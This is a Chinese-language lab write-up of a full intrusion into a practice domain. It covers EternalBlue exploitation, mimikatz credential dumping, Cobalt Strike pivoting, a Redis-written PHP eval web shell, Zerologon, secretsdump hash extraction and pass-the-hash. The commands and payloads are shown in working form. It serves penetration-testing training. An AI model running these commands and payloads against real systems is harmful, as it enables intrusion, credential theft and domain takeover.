## 靶场环境
| kali攻击机 | 外网win7 | 域成员-2016 | 域控-2019 |
| --- | --- | --- | --- |
| IP：10.0.0.128 | IP1:：10.0.0.137 | IP1：10.0.10.111 | IP：10.0.10.110 |
|  | IP2：10.0.20.98 | IP2：10.0.20.99 |  |
|  | 账号：win7   密码：admin | 账号信息   账号：Administrator   密码：Admin#123 | 账号：administrator   密码：Admin@666 |


## <font style="color:rgb(79, 79, 79);">信息收集</font>
```bash
┌──(kali㉿kali)-[~/Desktop/fscan]
└─$ ./fscan64 -h 10.0.0.0/24
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791744720507-c0eebe7e-86c3-48cf-b7e0-27d9937bd60a.png)

```bash
┌──(kali㉿kali)-[~/Desktop/fscan]
└─$ ./fscan64 -h 10.0.0.137
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791744856856-47de0525-1a7c-4125-9458-31e0a7b90886.png)

```bash
┌──(kali㉿kali)-[~/Desktop/fscan]
└─$ nmap -A -sV 10.0.0.137
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791744975288-cd351d57-90aa-43b7-8788-fa1c0b6a143a.png)

<font style="color:rgb(77, 77, 77);">根据结果可以看出目标主机开启80端口和445端口,访问网站：</font>[http://10.0.0.137:80/](http://10.0.0.137/)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791787779234-afe00525-3723-45f7-88d5-2e6a3f1e4095.png)

## <font style="color:rgb(79, 79, 79);">WIN7漏洞利用</font>
### 永恒之蓝利用
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ msfconsole 
# 加载攻击模块
msf6 > use exploit/windows/smb/ms17_010_eternalblue
# 设置目标 IP（你给出的靶机地址）
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.0.0.137
# 设置攻击机 IP（你的 Kali 地址，用于接收反弹连接）
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.0.0.128
# 确认配置无误
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791948904635-2a0d3e59-cfd0-4abf-a90c-8e5c9729e891.png)

发现是 SYSTEM 权限

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```bash
获取凭证信息
meterpreter > load mimikatz
meterpreter > kiwi_cmd sekurlsa::logonpasswords
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791949193454-50cba41e-9d15-416a-95ff-aea321e4c869.png)

### <font style="color:rgb(79, 79, 79);">通达OA利用工具+中国蚁剑</font>
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791787906311-4263bfdb-125a-416e-8d17-a45b5f5e34af.png)

成功连接中国蚁剑

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791949513816-de9fea21-5504-413b-8879-4ad4b72155e5.png)

## 使用 Cobaltstrike 进行渗透
```bash
┌──(root㉿kali)-[/home/kali/Desktop/Cobaltstrike/Server]
└─# ./teamserver 10.0.0.128 123456
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791950222933-1da8244e-d66a-4449-b988-dadc85ed2e98.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791950269269-fa8449c2-dc56-4116-9c91-8e03cbbaf8c8.png)

### 创建监听
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791950396185-baa8b9c9-48fa-4140-84e7-93cf90bdf4d7.png)

### 生成木马并上线
有效载荷-->Windows 可执行程序(E)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791953804529-f111dddf-39d8-4abb-8c54-97bfa4aadf39.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791953845122-536e6b2c-6711-46da-9d17-55abb8fd0ded.png)

CS 成功上线

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791953877948-75416233-461c-4274-969b-dfef5ec3d26d.png)

### 使用CS进行内网扫描
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791954070008-13b636d9-e160-4917-baef-1126b5f1ab84.png)

或者

```bash
 beacon> portscan 10.0.20.0-10.0.20.255 1-1024,3389,5000-6500 arp 1024
```

发现：主机10.0.20.99，开放端口：6379、5985、80、3389

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791954281982-bdcec9a8-6bfe-4b0a-899a-348dae7e5573.png)

## 搭建SOCK5代理
### 1、在CS中创建SOCKS5代理
```bash
1、打开CS客户端，点击已上线的Win7主机
2、选择 Pivots -> SOCKS Server
3、设置端口为1080，协议选择SOCKS5
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791954565113-0a755feb-86c9-4361-9178-80f4a50b3d61.png)

### 2、在Kali中配置代理转发
```bash
1、打开终端，使用以下命令编辑 proxychains 配置文件：/etc/proxychains4.conf
2、在文件末尾添加一行，指向代理服务器 socks5 10.0.0.128 1080
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791954813138-25f3aa17-2e8f-45b6-ad96-c81d1bfee342.png)

访问 10.0.20.99 主机

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791955515569-1b4fc5f7-914c-49ae-89cf-25ac44cf19c3.png)

目录扫描发现：

```bash
200    14KB  http://10.0.20.99/l.php
200    71KB  http://10.0.20.99/phpinfo.php
```

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ proxychains4 dirsearch -u http://10.0.20.99 -i 200
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791955670141-b55f5917-d59c-421b-998b-0a1d27ca1046.png)

访问：[http://10.0.20.99/phpinfo.php](http://10.0.20.99/phpinfo.php) 发现根目录：C:/phpStudy/PHPTutorial/WWW

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791955864158-56c040ff-96ed-4991-9d6a-77e37c4ff039.png)

## Redis 未授权漏洞利用
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ proxychains redis-cli -h 10.0.20.99
config set dir "C:/phpStudy/PHPTutorial/WWW/"
config set dbfilename "tx.php"
set 1 "<?php @eval($_POST['tx']);?>"
save
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791956138838-265aa276-1aa0-441b-a97f-ca0ec43347b8.png)

### 蚁剑连接 99 主机
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791956376136-527a8bd4-6fba-4ac2-9282-329fd9c66f10.png)

**蚁剑连接成功**

```bash
URL地址：http://10.0.20.99/tx.php
连接密码：tx
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791956524040-5dabbe15-1ce9-4fc4-9ac1-c5a559b9825d.png)

通过 ipconfig 发现10.0.10.111 主机

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791957106514-76e15c43-a2b0-444d-80a9-747933154635.png)

## 使用 Cobaltstrike 渗透 win2016
### 1、创建监听
右键 win7 -- 代理转发 -- 转发上线

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791957279656-a92c0eec-64e2-4d16-8813-c12e8497891a.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791957438928-816969b8-cd82-4160-a51f-04d338158864.png)

### 2、生成木马文件
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791957504959-0ffdf1ab-c8e5-4676-bd65-ee212c9c2b8c.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791957562625-83862568-1e40-4700-a2f1-d591069c2a97.png)

### 3、上传并执行木马
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791957640399-2c5a4304-965c-4bb4-a155-3d48f6701866.png)

成功上线

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791957711114-ccbf670e-befb-459f-b198-cd63f6630bf4.png)

## 收集域环境信息
```bash
1、关闭防火墙
shell netsh firewall set opmode mode=disable
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791957871144-887749a6-d0e8-4e32-9e32-9112be190e84.png)

```bash
2、确认域成员身份
shell systeminfo
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791957955705-91d5c373-a78d-4bc5-9dda-f0260bc014dc.png)

```bash
主机名:           WIN2016
OS 名称:          Microsoft Windows Server 2016 Datacenter
OS 版本:          10.0.14393 暂缺 Build 14393
OS 制造商:        Microsoft Corporation
OS 配置:          成员服务器
OS 构件类型:      Multiprocessor Free
注册的所有人:     Windows 用户
注册的组织:       
产品 ID:          00377-90000-00001-AA906
初始安装日期:     2021/11/14, 19:11:54
系统启动时间:     2026/10/14, 11:22:25
系统制造商:       VMware, Inc.
系统型号:         VMware7,1
系统类型:         x64-based PC
处理器:           安装了 2 个处理器。
                  [01]: AMD64 Family 25 Model 117 Stepping 2 AuthenticAMD ~3793 Mhz
                  [02]: AMD64 Family 25 Model 117 Stepping 2 AuthenticAMD ~3793 Mhz
BIOS 版本:        VMware, Inc. VMW71.00V.24006586.B64.2406042151, 2024/6/4
Windows 目录:     C:\Windows
系统目录:         C:\Windows\system32
启动设备:         \Device\HarddiskVolume2
系统区域设置:     zh-cn;中文(中国)
输入法区域设置:   zh-cn;中文(中国)
时区:             (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐
物理内存总量:     4,095 MB
可用的物理内存:   3,075 MB
虚拟内存: 最大值: 5,503 MB
虚拟内存: 可用:   4,507 MB
虚拟内存: 使用中: 996 MB
页面文件位置:     C:\pagefile.sys
域:               vulntarget.com
登录服务器:       暂缺
修补程序:         安装了 2 个修补程序。
                  [01]: KB3199986
                  [02]: KB3200970
网卡:             安装了 2 个 NIC。
                  [01]: Intel(R) 82574L Gigabit Network Connection
                      连接名:      Ethernet0
                      启用 DHCP:   否
                      IP 地址
                        [01]: 10.0.20.99
                        [02]: fe80::9190:38ad:1e9d:7f70
                  [02]: Intel(R) 82574L Gigabit Network Connection
                      连接名:      Ethernet1
                      启用 DHCP:   否
                      IP 地址
                        [01]: 10.0.10.111
                        [02]: fe80::919b:ab4d:10b3:df65
Hyper-V 要求:     已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。
```

```bash
3、分析网络配置与拓扑
shell ipconfig /all
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791958058782-69f7ddad-d2da-4247-a21a-dec93eb43bff.png)

```bash
Windows IP 配置

   主机名  . . . . . . . . . . . . . : win2016
   主 DNS 后缀 . . . . . . . . . . . : vulntarget.com
   节点类型  . . . . . . . . . . . . : 混合
   IP 路由已启用 . . . . . . . . . . : 否
   WINS 代理已启用 . . . . . . . . . : 否
   DNS 后缀搜索列表  . . . . . . . . : vulntarget.com

以太网适配器 Ethernet0:

   连接特定的 DNS 后缀 . . . . . . . : 
   描述. . . . . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   物理地址. . . . . . . . . . . . . : 00-0C-29-49-DB-32
   DHCP 已启用 . . . . . . . . . . . : 否
   自动配置已启用. . . . . . . . . . : 是
   本地链接 IPv6 地址. . . . . . . . : fe80::9190:38ad:1e9d:7f70%9(首选) 
   IPv4 地址 . . . . . . . . . . . . : 10.0.20.99(首选) 
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 
   DHCPv6 IAID . . . . . . . . . . . : 50334761
   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-29-22-A6-EE-00-0C-29-49-DB-32
   DNS 服务器  . . . . . . . . . . . : fec0:0:0:ffff::1%1
                                       fec0:0:0:ffff::2%1
                                       fec0:0:0:ffff::3%1
   TCPIP 上的 NetBIOS  . . . . . . . : 已启用

以太网适配器 Ethernet1:

   连接特定的 DNS 后缀 . . . . . . . : 
   描述. . . . . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection #2
   物理地址. . . . . . . . . . . . . : 00-0C-29-49-DB-3C
   DHCP 已启用 . . . . . . . . . . . : 否
   自动配置已启用. . . . . . . . . . : 是
   本地链接 IPv6 地址. . . . . . . . : fe80::919b:ab4d:10b3:df65%12(首选) 
   IPv4 地址 . . . . . . . . . . . . : 10.0.10.111(首选) 
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 
   DHCPv6 IAID . . . . . . . . . . . : 117443625
   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-29-22-A6-EE-00-0C-29-49-DB-32
   DNS 服务器  . . . . . . . . . . . : 10.0.10.110
   TCPIP 上的 NetBIOS  . . . . . . . : 已启用

隧道适配器 Reusable ISATAP Interface {7C87EAD8-21EE-41BC-BDD4-B94E9E2E7198}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
   连接特定的 DNS 后缀 . . . . . . . : 
   描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter
   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP 已启用 . . . . . . . . . . . : 否
   自动配置已启用. . . . . . . . . . : 是

隧道适配器 isatap.{A7027029-ECC3-4186-BC98-9DCE01AAA9D0}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
   连接特定的 DNS 后缀 . . . . . . . : 
   描述. . . . . . . . . . . . . . . : Microsoft ISATAP Adapter #2
   物理地址. . . . . . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP 已启用 . . . . . . . . . . . : 否
   自动配置已启用. . . . . . . . . . : 是

```

```bash
4、定位域控制器
shell net group "domain controllers" /domain
shell nltest /dsgetdc:vulntarget.com
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791958330365-fcfe939b-10fa-4c0f-a648-ab995730a0a3.png)

```bash
5、获取域控制器IP地址
shell ping vulntarget.com
shell nslookup win2019.vulntarget.com
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791958571349-08eccf1c-c24c-43b5-9bce-9303b124ec63.png)

```bash
6、定位域管理员
shell net group "enterprise admins" /domain
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791958924331-c8ca572e-9955-4a43-968e-f9c5685634d1.png)

## 横向win2019与域控提权
### 1、解决网络可达性问题
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791959151185-6fa4f041-c8fc-4ca8-8c34-a1062439f6c3.png)

设置：SOCKS5 1081

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791959204195-04ca40c3-b6ab-4a66-9eca-976e0a95b46e.png)

### 2、kali 配置代理转发
```bash
1、打开配置文件：/etc/proxychains4.conf
2、在文件末尾添加以下内容：SOCKS5 10.0.0.128 1081
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791959431773-5c73a2f3-aeae-4ac7-97a4-7e1028611be6.png)

### 3、 验证漏洞
#### 1、执行漏洞攻击脚本，验证目标是否存在Zerologon漏洞
```bash
┌──(kali㉿kali)-[~/Desktop/CVE-2020-1472]
└─$ proxychains python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110
```

目标存在Zerologon漏洞

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791961195211-bf75eff7-1b2c-45ae-83d3-3f522d4a36f7.png)

#### 2、使用Impacket获取域管理员哈希
```bash
┌──(kali㉿kali)-[~/Desktop/impacket-0.13.0/examples]
└─$ proxychains python3 secretsdump.py vulntarget.com/WIN2019\$@10.0.10.110 -no-pass
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791961552961-453efd10-add1-41c0-8d6a-c8142ac788b4.png)

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a3dd8e4a352b346f110b587e1d1d1936:::
vulntarget.com\win2016:1601:aad3b435b51404eeaad3b435b51404ee:dfc8d2bfa540a0a6e2248a82322e654e:::
WIN2019$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN2016$:1602:aad3b435b51404eeaad3b435b51404ee:1d99fda3a2aa36e150fff86322284067:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:70a1edb09dbb1b58f1644d43fa0b40623c014b690da2099f0fc3a8657f75a51d
Administrator:aes128-cts-hmac-sha1-96:04c435638a00755c0b8f12211d3e88a1
Administrator:des-cbc-md5:dcc29476a789ec9e
krbtgt:aes256-cts-hmac-sha1-96:f7a968745d4f201cbeb73f4b1ba588155cfd84ded34aaf24074a0cfe95067311
krbtgt:aes128-cts-hmac-sha1-96:f401ac35dc1c6fa19b0780312408cded
krbtgt:des-cbc-md5:10efae67c7026dbf
vulntarget.com\win2016:aes256-cts-hmac-sha1-96:e4306bef342cd8215411f9fc38a063f5801c6ea588cc2fee531342928b882d61
vulntarget.com\win2016:aes128-cts-hmac-sha1-96:6da7e9e046c4c61c3627a3276f5be855
vulntarget.com\win2016:des-cbc-md5:6e2901311c32ae58
WIN2019$:aes256-cts-hmac-sha1-96:092c877c3b20956347d535d91093bc1eb16b486b630ae2d99c0cf15da5db1390
WIN2019$:aes128-cts-hmac-sha1-96:0dca147d2a216089c185d337cf643e25
WIN2019$:des-cbc-md5:01c8894f541023bc
WIN2016$:aes256-cts-hmac-sha1-96:8393e600571fd27d4c0ada2b43ce9ca3c08256fd39d97b6cb45faaa00b163c99
WIN2016$:aes128-cts-hmac-sha1-96:7938b1d977018f1e6612d8d5de57df2d
WIN2016$:des-cbc-md5:f7a2b50123fba2fd

```

#### 3、哈希传递，建立控制会话
```bash
┌──(kali㉿kali)-[~/Desktop/impacket-0.13.0/examples]
└─$ proxychains python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 vulntarget/administrator@10.0.10.110
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/59198879/1791961831228-06add724-5e13-4c1e-9ec2-77e0ecf2f242.png)

